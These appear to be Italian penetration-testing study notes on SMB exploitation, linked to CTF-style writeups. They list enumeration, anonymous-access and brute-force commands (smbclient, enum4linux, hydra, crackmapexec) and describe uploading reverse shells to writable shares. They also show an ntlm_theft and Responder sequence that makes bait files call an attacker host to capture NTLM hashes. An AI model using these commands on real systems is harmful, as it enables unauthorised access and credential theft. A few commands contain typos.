#Exploitation_porte

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Comandi]]
- [[#Bruteforce]]
- [[#Enumerazione Share e Hostname]]
- [[#Accesso Anonimo]]
- [[#Enumerazione Utenti e SID]]
- [[#Scarica File]]
- [[#Carica File]]
- [[#Active Directory]]
	1. [[#Password Scaduta]]
	2. [[#Credenziali Deboli]]
	3. [[#Active Directory#Carica File | Carica File]]

---
---
---
### Introduzione
_SMB (Server Message Block)_ √® un protocollo di rete utilizzato per la condivisione di file, stampanti e altre risorse nei sistemi Windows. Opera su:
- Porta TCP/445: SMB moderno (diretto su TCP)
- Porta TCP/139: NetBIOS/SMB legacy (su NetBIOS Session Service)
√à una superficie di attacco critica durante un penetration test, specialmente per:
- Enumerazione informazioni
- Accesso a file condivisi
- Movimenti laterali
- RCE e Privilege Escalation

---
### Comandi

| **Comando**                            | **Descrizione**                      |
| -------------------------------------- | ------------------------------------ |
| `ls`                                   | Elenco file nella directory corrente |
| `cd dir`                               | Cambia directory                     |
| `get FILE`                             | Scarica file dal server              |
| `put FILE`                             | Carica un file                       |
| `mkdir DIR`                            | Crea una directory                   |
| `del FILE`                             | Elimina un file                      |
| `recurse ON` + `prompt OFF` + `mget *` | Scarica tutti i file in una cartella |

---
### Enumerazione Share e Hostname
Si pu√≤ iniziare con:

```
smbclient -L //TARGET -U USER
```

---
### Accesso Anonimo
Molti sistemi permettono accesso anonimo a share pubbliche:

```
smbclient //TARGET/share -N
```

```
smbclient -L //TARGET -N #Lista cartelle condivise
```

Writeups:
- *Linux:*[[Linux#Friendzone| FriendZone]],[[Linux#Kenobi| Kenobi]],
- *Windows:*[[Windows#Bastion| Bastion]], 

---
### Enumerazione Utenti e SID
Enumerazione utenti tramite e SID:

```
enum4linux -a TARGET
```

---
### Bruteforce

```
hydra -U users.txt -P pass.txt smb://IP_TARGET
```

---
### Scarica File
Una volta ottenuto l'accesso √® possibile scaricare file dalla cartella condivisa:

```
get FILE
```

```
recurse ON
prompt OFF
mget *
```

---
### Carica File
Nel caso la cartella condivisa sia in modalit√† di scrittura allora √® possibile caricare file malevoli (es: [[üî° Glossario#Reverse shell| reverse shell]]):

```
put FILE
```

Writeups:
- *Active Directory:*[[üìö WRITEUPS/üåç Ambienti/Active Directory#Breach| Breach]], 

---
---
# Active Directory
### Password Scaduta
Se si hanno delle credenziali e le si provano con:

```
nxc smb ip_target -u users.txt -p 'PASS'
```

Se si ottiene il messaggio di errore `STATUS_PASSWORD_MUST_CHANGE` √® possibile rinnovare la vecchia password con una nuova utilizzando []():

```
apt install krb5-user`
```

```
kpasswd username
```

Writeups:
- [[üìö WRITEUPS/üåç Ambienti/Active Directory#Baby| Baby]],

---
### Credenziali Deboli
Per credenziali deboli s'intendono password molto utilizzate come:
- `username:username`
- `username:rockyou.txt`
- `username:hostname`

```
for user in $(cat users.txt); do crackmapexc smb IP_TARGET -u $user -p $pass; done
```

```
hydra -U users.txt -P pass.txt ssh://ip_target
```

---
### Carica File
Nel caso la cartella condivisa sia in modalit√† di scrittura allora √® possibile caricare file malevoli. Assumendo che le cartelle sono navigate allora possiamo caricare [ntlm_theft](https://github.com/Greenwolf/ntlm_theft):

```
put FILE
```

```
python3 ntlm_theft.py -g all -s IP_KALI -f NAME_OUTFILE
recurse on
prompt off
mput *
responder -I tun0
```

Writeups:
- *Active Directory:*[[üìö WRITEUPS/üåç Ambienti/Active Directory#Breach| Breach]], 